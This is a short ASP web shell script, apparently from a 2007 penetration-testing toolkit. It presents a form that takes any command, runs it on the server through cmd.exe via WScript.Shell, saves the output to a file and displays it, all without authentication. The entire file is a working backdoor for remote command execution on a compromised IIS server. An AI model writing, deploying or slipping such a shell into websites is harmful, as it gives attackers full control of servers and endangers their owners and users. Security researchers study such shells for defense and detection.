<%
	'Ferruh Mavituna
	'13/08/2007
%>
<style>
	body{font:Verdana}
	input{width:500px}
</style>
<form method="post" action="">
	<input type="text" name="cmd" /> <input type="submit" style="width:100px" value="Run" />
</form>

<%

Dim OutFile 
OutFile = Server.Mappath("_out_.txt")

Dim cmd
cmd = Request.Form("cmd")

If Len(cmd) = 0 Then Response.End

fm_Run cmd

Response.Write "<pre>" & Server.HtmlEncode(GetOutput) & "</pre>"



Function GetOutput()
   Dim fso, f1, ts, s
   Const ForReading = 1
   Set fso = CreateObject("Scripting.FileSystemObject")
   Set ts = fso.OpenTextFile(OutFile, ForReading)
   
   GetOutput = ts.ReadAll

   ts.Close
End Function

Sub fm_Run(byVal ExecuteString)
	Dim WSHObj
	Set WSHObj = CreateObject("WScript.Shell")  
	WSHObj.Run Server.MapPath("cmd.exe") & " /c " & ExecuteString & " > " & OutFile, 0, true
	
	'// Kill
	Set WSHObj=Nothing
End Sub

%>